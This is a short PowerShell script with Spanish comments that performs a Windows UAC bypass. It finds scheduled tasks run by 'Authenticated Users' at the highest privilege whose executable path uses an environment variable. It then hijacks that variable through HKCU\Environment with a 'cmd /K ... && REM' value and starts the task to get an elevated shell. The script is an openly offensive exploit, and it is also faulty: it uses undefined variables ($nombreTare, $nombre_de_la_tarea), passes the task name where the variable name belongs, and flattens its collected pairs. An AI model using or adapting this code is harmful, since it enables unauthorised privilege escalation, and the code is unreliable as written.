# Función para comprobar si el string contiene dos caracteres consecutivos "$"
function ComprobarString($texto) {
    # Define el patrón de expresión regular para buscar el texto entre $ y asignarlo a una variable
    $patron = '\%(.*?)\%'

    # Comprueba si el texto contiene el patrón utilizando la expresión regular
    $coincidencias = [regex]::Matches($texto, $patron)

    # Si hay al menos una coincidencia, devuelve el texto original
    if ($coincidencias.Count -ge 1) {
        return $true
    }
    else {
        return $false
    }
}

function ObtenerVariableDeEntorno($texto) {
    # Divide la ruta en partes utilizando "%%" como delimitador
    $partes = $texto -split '%'

    # Devuelve la primera parte que representa el directorio raíz
    return $partes[1]
}

### PROGRAMA PRINCIPAL ###
# Obtener todas las tareas programadas y guardarlas en una variable
$tareas = Get-ScheduledTask

# Inicializar una lista para almacenar las tareas que cumplen con los criterios especificados
$tareasCumplen = @()

# Iterar sobre cada tarea para verificar si cumple con los criterios
foreach ($tarea in $tareas) {
    $nombre_tarea = $tarea.TaskName
    $id_tarea = $tarea.Principal.Id
    $level = $tarea.Principal.RunLevel
    $posible_variable_entorno = $tarea.Actions[0].Execute
    
    if ($id_tarea -eq "Authenticated Users" -and $level -eq "Highest") {
        # Comprobar si existe una variable de entorno la cual sea vulnerable
        if (ComprobarString($posible_variable_entorno)){
           $variableDeEntornoVulnerable = ObtenerVariableDeEntorno($posible_variable_entorno)
           $aux = @($nombre_tarea, $variableDeEntornoVulnerable)
           $tareasCumplen += $aux
        }
    }
}

# Imprimir las tareas que cumplen con los criterios
foreach ($tarea in $tareasCumplen) {
    $nombreTarea = $tarea[0]  # Accediendo al primer elemento de la tupla
    # Bypass
    reg add hkcu\Environment /v $nombreTare /d "cmd /K reg delete hkcu\Environment /v $nombreTare /f && REM "
    # Recargar las variables de entorno en la propia terminal
    refreshenv
    # Obtener un cmd
    Start-ScheduledTask -TaskName $nombre_de_la_tarea
}